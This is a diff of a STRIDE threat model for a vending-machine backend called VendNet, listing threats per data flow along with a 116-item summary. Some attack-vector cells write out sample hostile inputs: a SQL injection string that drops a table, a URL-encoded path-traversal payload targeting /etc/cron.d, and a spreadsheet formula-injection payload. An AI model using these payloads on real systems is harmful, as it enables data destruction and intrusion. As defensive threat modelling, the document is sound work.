+| **T**ampering | Yes | T-110 | **Second-order SQL injection: stored malicious input executed in later native query**: Attacker stores SQL metacharacters in a value (e.g., product name) via a safe parameterised INSERT; a background report-generation or analytics job later retrieves that value and concatenates it into a native SQL query string without re-parameterisation. | Attacker creates a product named `Juice'; DROP TABLE sale; --`; a scheduled reporting job builds `"SELECT * FROM sale WHERE product_name = '" + productName + "'"` as a native query; the injected SQL executes. | External attacker / malicious insider | Hibernate JPQL parameterisation for standard queries; native query paths in reporting jobs require individual review | High |
+| **D**enial of Service | Yes | T-111 | **N+1 Hibernate query pattern exhausts database connection pool**: A lazily-loaded JPA association causes the application to issue N additional queries for each item in a list response (1 list query + N individual slot/sale queries), consuming N+1 DB connections per API request and exhausting HikariCP. | Attacker calls `GET /machines` returning 200 machines; lazy-loaded `slots` collection triggers 200 additional `SELECT` queries; 201 HikariCP connections consumed for one request; pool exhausted for concurrent users. | External attacker / coincidental load | Spring Data JPA; `@EntityGraph` or `JOIN FETCH` recommended; lazy loading strategy not documented | Medium |
+
+---
+
+#### DF12 — MySQL Database → VendNet (Query Results)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **I**nformation Disclosure | Yes | T-112 | **Over-broad JPA query returns records beyond the requesting user's authorised scope**: A Spring Data repository method for a user-scoped endpoint omits the `userId` filter predicate, returning all records in the table rather than only those belonging to the requesting user. | Customer calls `GET /customers/{id}/history`; backing repository method resolves to `saleRepository.findAll()` rather than `findByUserId(userId)`; all `Sale` records returned for all users. | Malicious customer | Spring Data JPA query definitions; explicit predicate enforcement in all user-scoped repository methods | High |
+
+---
+
+#### DF13 — VendNet → Server File System (Backup Files, Audit Logs, Report Directories)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **T**ampering | Yes | T-113 | **Path traversal in report type name writes to OS directory outside `/var/vendnet/` sandbox**: A crafted `reportType` value passes the whitelist regex check (via URL encoding, Unicode normalisation, or null-byte injection) but after canonicalisation resolves outside the intended subtree, causing `Files.createDirectories()` to create arbitrary OS paths. | Admin submits `{"reportType":"%2e%2e%2fetc%2fcron.d%2fvendnet"}`; if URL decoding occurs after the whitelist check, the traversal bypasses validation; directories created in `/etc/cron.d/`. | Malicious insider (Administrator) / external attacker with Admin access | Whitelist pattern `^[a-zA-Z0-9_-]+$`; canonicalise path first, then assert it starts with `/var/vendnet/reports/` as defence in depth | Critical |
+| **D**enial of Service | Yes | T-114 | **Concurrent on-demand backup requests saturate disk I/O and fill available space**: Two or more simultaneous on-demand backup requests trigger concurrent `mysqldump` invocations, each writing a large encrypted archive; combined I/O saturates disk throughput and may fill the partition before the rotation job runs. | Admin (or compromised Admin session) calls `POST /admin/backups` twice in rapid succession; two large `mysqldump` processes write simultaneously; disk fills; subsequent audit log writes fail with `ENOSPC`. | Malicious insider / infrastructure overload | 30-day rotation policy; concurrency limit on backup jobs not documented | Medium |
+
+---
+
+#### DF14 — Server File System → VendNet (Backup Status, Log Contents, Report Files)
+
+| STRIDE | Applicable? | Threat ID | Threat Description | Attack Vector | Threat Agent | Existing Controls | Severity |
+|--------|:-----------:|-----------|-------------------|---------------|-------------|-------------------|----------|
+| **T**ampering | Yes | T-115 | **Attacker plants malicious CSV file in report directory; application serves it as a legitimate report**: An OS-level attacker with write access to `/var/vendnet/reports/` writes a crafted `daily_sales_summary.csv` containing CSV injection payloads; the application reads and serves it to the Administrator. | Attacker writes `=SYSTEM("calc.exe"),...` to the report file; Administrator downloads and opens it in a spreadsheet application; formula injection executes under the Administrator's desktop context. | OS-level attacker / malicious insider | `640` / `700` permissions limit writes to service account; CSV injection (formula injection) sanitisation in report generation not confirmed | Medium |
+| **I**nformation Disclosure | Yes | T-116 | **Audit log file served via API exposes full security event history to Operator role**: The audit log retrieval endpoint (`GET /logs/audit`) serves raw log file contents, including security events (login failures, role changes, Admin actions); a misconfigured endpoint serves them to Operator-role callers who should only see operational machine logs. | Operator calls `GET /logs/audit`; if the endpoint uses `hasAnyRole('OPERATOR','ADMINISTRATOR')` instead of `hasRole('ADMINISTRATOR')`, the full security event history is returned. | Malicious insider (Operator) / external attacker with Operator JWT | RBAC matrix specifies Admin-only audit log access; explicit `hasRole('ADMINISTRATOR')` on endpoint confirmed | High |
+
+---
 
 ## 4.3 Threat Summary
 
-| Threat ID | Element | STRIDE | Description | Severity (pre-mitigation) |
-|-----------|---------|--------|-------------|---------------------------|
-| T-01 | <!-- TODO --> | S | <!-- TODO --> | <!-- TODO --> |
-| T-02 | <!-- TODO --> | T | <!-- TODO --> | <!-- TODO --> |
-| ... | | | | |
+| Threat ID | Element | STRIDE | Threat Description (brief) | Severity |
+|-----------|---------|:------:|---------------------------|:--------:|
+| T-01 | E1 Customer | S | Credential stuffing / account takeover | High |
+| T-02 | E1 Customer | T | Purchase request `unitPrice` parameter manipulation | Medium |
+| T-03 | E1 Customer | R | Purchase repudiation / fraudulent chargeback | Medium |
+| T-04 | E1 Customer | I | Horizontal IDOR — read other customer's purchase history | High |
+| T-05 | E1 Customer | D | Brute-force login flood causes victim account lockout | Medium |
+| T-06 | E1 Customer | E | JWT `role` claim tampered to escalate to Administrator | Critical |
+| T-07 | E2 Operator | S | Operator credential theft via spear-phishing | High |
+| T-08 | E2 Operator | T | Falsified stock restock submission (phantom inventory) | Medium |
+| T-09 | E2 Operator | R | Denial of stock update causing inventory discrepancy | Medium |
+| T-10 | E2 Operator | I | Cross-machine IDOR — unauthorised telemetry access | High |
+| T-11 | E2 Operator | E | Operator calls Administrator-only endpoint (missing `@PreAuthorize`) | High |
+| T-12 | E3 Administrator | S | Administrator account takeover (no MFA documented) | Critical |
+| T-13 | E3 Administrator | T | Rogue Administrator reassigns user roles / suspends accounts | High |
+| T-14 | E3 Administrator | R | Administrator denies pricing change or backup trigger | Medium |
+| T-15 | E3 Administrator | I | Mass data exfiltration via compromised Administrator account | Critical |
+| T-16 | E3 Administrator | D | Disk exhaustion via repeated on-demand backup generation | Medium |
+| T-17 | E3 Administrator | E | OS command execution via `ProcessBuilder` abuse from Admin account | Critical |
+| T-18 | E4 Vending Machine | S | Rogue machine presents stolen mTLS client certificate | High |
+| T-19 | E4 Vending Machine | T | Compromised firmware sends falsified sales events | High |
+| T-20 | E4 Vending Machine | R | Machine operator denies erroneous telemetry / sales data origin | Medium |
+| T-21 | E4 Vending Machine | I | Compromised firmware harvests pushed configuration and price data | Medium |
+| T-22 | E4 Vending Machine | D | Compromised machine floods telemetry endpoint | High |
+| T-23 | E4 Vending Machine | E | VM mTLS cert used to access non-telemetry endpoints | High |
+| T-24 | E5 Payment Gateway | S | Spoofed payment confirmation webhook bypasses HMAC | Critical |
+| T-25 | E5 Payment Gateway | T | Payment callback payload modified (FAILED→COMPLETED) | High |
+| T-26 | E5 Payment Gateway | R | Payment Gateway disputes having sent a confirmation | Medium |
+| T-27 | E5 Payment Gateway | D | Payment Gateway outage blocks all card/mobile sales | High |
+| T-28 | P1 Auth & Authz | S | JWT `alg:none` signature-bypass attack | Critical |
+| T-29 | P1 Auth & Authz | S | JWT HMAC secret brute-force (weak signing key) | High |
+| T-30 | P1 Auth & Authz | T | JWT payload `role` claim tampered after secret recovery | Critical |
+| T-31 | P1 Auth & Authz | R | Auth events logged without IP / user-agent context | Medium |
+| T-32 | P1 Auth & Authz | I | Username enumeration via differential login responses | Medium |
+| T-33 | P1 Auth & Authz | I | PII readable in JWT payload (base64, unencrypted) | Low |
+| T-34 | P1 Auth & Authz | D | BCrypt-amplified login flood exhausts Tomcat thread pool | High |
+| T-35 | P1 Auth & Authz | E | Suspended account's unexpired JWT remains valid (no revocation list) | High |
+| T-36 | P1 Auth & Authz | E | Missing method-level `@PreAuthorize` on application service layer | High |
+| T-37 | P2 Inventory Mgmt | S | Stolen Operator JWT used from unrecognised location | Medium |
+| T-38 | P2 Inventory Mgmt | T | IDOR — stock update on machine outside Operator's assigned fleet | High |
+| T-39 | P2 Inventory Mgmt | T | SQL injection via inventory search query parameters | Critical |
+| T-40 | P2 Inventory Mgmt | R | Stock update audit log missing Operator identity and slot detail | Medium |
+| T-41 | P2 Inventory Mgmt | I | Full fleet GPS/config enumeration via unbounded `GET /machines` | Medium |
+| T-42 | P2 Inventory Mgmt | D | Malformed slot data triggers unhandled domain exception | Low |
+| T-43 | P2 Inventory Mgmt | E | Mass-assignment on inventory endpoint silently modifies product pricing | High |
+| T-44 | P3 Sales Processing | S | JWT replay attack repeats purchase on behalf of victim | Medium |
+| T-45 | P3 Sales Processing | T | TOCTOU race condition causes overselling (negative stock) | High |
+| T-46 | P3 Sales Processing | T | Client-supplied `unitPrice` bypasses server-side catalog validation | Critical |
+| T-47 | P3 Sales Processing | R | Missing payment `transactionRef` prevents chargeback dispute resolution | High |
+| T-48 | P3 Sales Processing | I | IDOR on `GET /sales/{saleId}` exposes other customers' purchases | High |
+| T-49 | P3 Sales Processing | D | Purchase flood exhausts Payment Gateway API quota | High |
+| T-50 | P3 Sales Processing | E | Unauthenticated `POST /sales` processed (missing security filter) | Critical |
+| T-51 | P4 Telemetry | S | Telemetry packet replay injects stale data as current readings | Medium |
+| T-52 | P4 Telemetry | T | Compromised machine injects false stock-depletion telemetry | High |
+| T-53 | P4 Telemetry | R | Telemetry source `MachineId` not recorded in audit log | Medium |
+| T-54 | P4 Telemetry | I | Telemetry response exposes GPS coordinates and activity patterns | Medium |
+| T-55 | P4 Telemetry | D | Coordinated VM fleet floods telemetry database | High |
+| T-56 | P4 Telemetry | E | Malicious telemetry payload exploits server-side deserialisation | High |
+| T-57 | P5 OS Operations | S | Non-Administrator triggers backup/rotation via RBAC misconfiguration | High |
+| T-58 | P5 OS Operations | T | Path traversal via report type parameter escapes sandbox | Critical |
+| T-59 | P5 OS Operations | T | OS command injection via unsanitised `ProcessBuilder` parameters | Critical |
+| T-60 | P5 OS Operations | R | OS file operations not correlated to requesting Admin in audit log | Medium |
+| T-61 | P5 OS Operations | I | Backup files world-readable due to permission misconfiguration | High |
+| T-62 | P5 OS Operations | D | Disk exhaustion from silent backup rotation failure | Medium |
+| T-63 | P5 OS Operations | E | Application-to-OS privilege escalation via `ProcessBuilder` injection | Critical |
+| T-64 | P6 Pricing & Config | S | Suspended Admin's unexpired JWT authorises pricing changes | High |
+| T-65 | P6 Pricing & Config | T | Rogue Admin sets all product prices to zero across full catalog | Critical |
+| T-66 | P6 Pricing & Config | R | Price change not attributed to specific Admin in audit log | Medium |
+| T-67 | P6 Pricing & Config | I | Config endpoint response reveals internal infrastructure details | High |
+| T-68 | P6 Pricing & Config | D | Rapid config update flood causes excessive DB write contention | Medium |
+| T-69 | P6 Pricing & Config | E | Operator accesses pricing endpoint via overly permissive annotation | High |
+| T-70 | DS1 MySQL | S | Direct DB access using leaked application credentials | Critical |
+| T-71 | DS1 MySQL | T | Direct SQL modification bypasses application audit and business rules | Critical |
+| T-72 | DS1 MySQL | T | SQL injection modifies user roles, prices, or sale records | Critical |
+| T-73 | DS1 MySQL | R | No DB-level audit trail for direct-access operations | High |
+| T-74 | DS1 MySQL | I | Full table extraction via SQL injection UNION attack | Critical |
+| T-75 | DS1 MySQL | I | MySQL error messages in HTTP response expose schema structure | Medium |
+| T-76 | DS1 MySQL | D | DB connection pool exhaustion via time-delayed query injection | High |
+| T-77 | DS1 MySQL | E | Excessive DB account privileges enable DDL (DROP/CREATE) operations | Critical |
+| T-78 | DS2 File System | S | OS attacker reads backup archive as application service account | High |
+| T-79 | DS2 File System | T | Audit log file tampered to erase security event evidence | High |
+| T-80 | DS2 File System | T | Symlink attack on report directory writes data outside sandbox | High |
+| T-81 | DS2 File System | R | File system operations not linked to requesting user in audit log | Medium |
+| T-82 | DS2 File System | I | Report files with customer PII served beyond Admin scope | High |
+| T-83 | DS2 File System | D | Disk exhaustion from silent report/log accumulation | Medium |
+| T-84 | DS2 File System | E | Path traversal writes to privileged OS directory enabling persistence | Critical |
+| T-85 | DF1 Customer→VendNet | S | Credential interception via TLS downgrade / SSL stripping | Medium |
+| T-86 | DF1 Customer→VendNet | T | HTTP parameter pollution injects duplicate price field | Low |
+| T-87 | DF1 Customer→VendNet | I | Credentials captured in application DEBUG-level logs | Medium |
+| T-88 | DF1 Customer→VendNet | D | Authenticated HTTP flood exhausts Tomcat thread pool | High |
+| T-89 | DF2 VendNet→Customer | S | JWT leaked in verbose error response or access log | Medium |
+| T-90 | DF2 VendNet→Customer | T | API response modified via TLS cert mismatch on client side | Medium |
+| T-91 | DF2 VendNet→Customer | I | JPA query missing `userId` filter returns all customers' records | High |
+| T-92 | DF2 VendNet→Customer | D | Unbounded response payload from unpaginated endpoint exhausts heap | Medium |
+| T-93 | DF3 Operator→VendNet | T | Stock update payload tampered by proxy-level MITM | Medium |
+| T-94 | DF3 Operator→VendNet | D | Operator endpoint flood causes DB write contention | Medium |
+| T-95 | DF4 VendNet→Operator | I | Machine log response exposes security audit events to Operator role | Medium |
+| T-96 | DF5 Admin→VendNet | S | Admin JWT exfiltrated via XSS in companion web UI | High |
+| T-97 | DF5 Admin→VendNet | T | Admin config request body modified via TLS misconfiguration | Medium |
+| T-98 | DF5 Admin→VendNet | D | Admin endpoint flooded via compromised Admin session | Medium |
+| T-99 | DF6 VendNet→Admin | T | Audit log response modified in transit to conceal attacker activity | Medium |
+| T-100 | DF6 VendNet→Admin | I | `GET /admin/users` response serialises BCrypt password hashes | High |
+| T-101 | DF7 VM→VendNet | S | Stolen mTLS cert used from attacker cloud infrastructure | High |
+| T-102 | DF7 VM→VendNet | T | Compromised firmware sends false sales events (inflated quantity) | High |
+| T-103 | DF7 VM→VendNet | D | Coordinated telemetry flood from multiple compromised VMs | High |
+| T-104 | DF8 VendNet→VM | T | Config push tampered on legacy machine without mTLS enforcement | High |
+| T-105 | DF8 VendNet→VM | I | Price list and slot config stored in plaintext on VM device | Medium |
+| T-106 | DF9 VendNet→PayGW | T | Payment amount tampered in outbound request via SSRF | High |
+| T-107 | DF9 VendNet→PayGW | I | Payment request body captured in DEBUG-level application log | Medium |
+| T-108 | DF10 PayGW→VendNet | S | Forged payment confirmation webhook bypasses HMAC validation | Critical |
+| T-109 | DF10 PayGW→VendNet | T | Payment status modified FAILED→COMPLETED in callback payload | High |
+| T-110 | DF11 VendNet→MySQL | T | Second-order SQL injection via stored malicious input in native query | High |
+| T-111 | DF11 VendNet→MySQL | D | N+1 Hibernate query pattern exhausts DB connection pool | Medium |
+| T-112 | DF12 MySQL→VendNet | I | Over-broad JPA query returns records beyond authorised scope | High |
+| T-113 | DF13 VendNet→FS | T | Path traversal in report type name writes outside `/var/vendnet/` sandbox | Critical |
+| T-114 | DF13 VendNet→FS | D | Concurrent backup writes saturate disk I/O and fill partition | Medium |
+| T-115 | DF14 FS→VendNet | T | Malicious CSV planted in report directory served to Administrator | Medium |
+| T-116 | DF14 FS→VendNet | I | Audit log file API serves full security event history to Operator role | High |
+
+---
+
+*Total threats identified: **116** (T-01 – T-116)*
+
+*Severity distribution — Critical: 22 · High: 56 · Medium: 35 · Low: 3*
+
+*All threats feed directly into §5 (Abuse Cases), §6 (Risk Assessment), §7 (Mitigations), and §8 (Security Requirements). Critical and High threats are prioritised for immediate mitigation planning.*
